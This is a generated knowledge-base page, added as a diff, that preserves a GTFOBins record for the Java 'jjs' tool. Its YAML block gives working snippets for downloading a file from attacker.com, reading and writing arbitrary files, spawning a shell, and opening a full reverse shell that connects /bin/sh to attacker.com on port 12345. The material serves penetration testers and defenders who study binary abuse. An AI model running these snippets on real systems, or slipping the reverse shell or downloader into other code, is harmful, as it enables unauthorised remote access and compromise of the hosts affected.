@@ -1,0 +1,124 @@
+---
+parsed_by: focuslocust
+source: gtfobins
+type: generated
+---
+# jjs
+
+[Home](../../../README.md)
+
+## Provenance
+
+| Field | Value |
+| --- | --- |
+| Source | `gtfobins` |
+| Type | `tool` |
+| Record ID | `jjs` |
+| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/jjs` |
+| Parsed by | `focuslocust` |
+| Relationship mode | `explicit / conservative inferred / manual` |
+
+## Generated Concept Page
+
+- [jjs](../../tools/linux/jjs.md)
+
+## Extracted Fields
+
+| Field | Value |
+| --- | --- |
+| id | jjs |
+| name | jjs |
+| type | tool |
+| source | gtfobins |
+| url | https://gtfobins.github.io/gtfobins/jjs/ |
+
+## Preserved Source Material
+
+```yaml
+_body: ''
+_name: jjs
+_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/jjs
+comment: This tool is installed starting with Java SE 8.
+functions:
+  download:
+  - code: 'jjs
+
+      var URL = Java.type(''java.net.URL'');
+
+      var ws = new URL(''http://attacker.com/path/to/input-file'');
+
+      var Channels = Java.type(''java.nio.channels.Channels'');
+
+      var rbc = Channels.newChannel(ws.openStream());
+
+      var FileOutputStream = Java.type(''java.io.FileOutputStream'');
+
+      var fos = new FileOutputStream(''/path/to/output-file'');
+
+      fos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);
+
+      fos.close();
+
+      rbc.close();'
+    contexts:
+      sudo: null
+      unprivileged: null
+    sender: http-server
+  file-read:
+  - code: 'jjs
+
+      var BufferedReader = Java.type(''java.io.BufferedReader'');
+
+      var FileReader = Java.type(''java.io.FileReader'');
+
+      var br = new BufferedReader(new FileReader(''/path/to/input-file''));
+
+      while ((line = br.readLine()) != null) { print(line); }'
+    contexts:
+      sudo: null
+      unprivileged: null
+  file-write:
+  - code: 'jjs
+
+      var FileWriter = Java.type(''java.io.FileWriter'');
+
+      var fw=new FileWriter(''/path/to/output-file'');
+
+      fw.write(''DATA'');
+
+      fw.close();'
+    contexts:
+      sudo: null
+      unprivileged: null
+  reverse-shell:
+  - code: 'jjs
+
+      var host=''attacker.com'';
+
+      var port=12345;
+
+      var ProcessBuilder = Java.type(''java.lang.ProcessBuilder'');
+
+      var p=new ProcessBuilder(''/bin/sh'', ''-i'').redirectErrorStream(true).start();
+
+      var Socket = Java.type(''java.net.Socket'');
+
+      var s=new Socket(host,port);
+
+      var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
+
+      var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read());
+      while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type(''java.lang.Thread'').sleep(50);
+      try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'
+    contexts:
+      sudo: null
+      unprivileged: null
+    listener: tcp-server
+  shell:
+  - code: 'jjs
+
+      Java.type(''java.lang.Runtime'').getRuntime().exec(''/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty'').waitFor()'
+    contexts:
+      sudo: null
+      unprivileged: null
+```
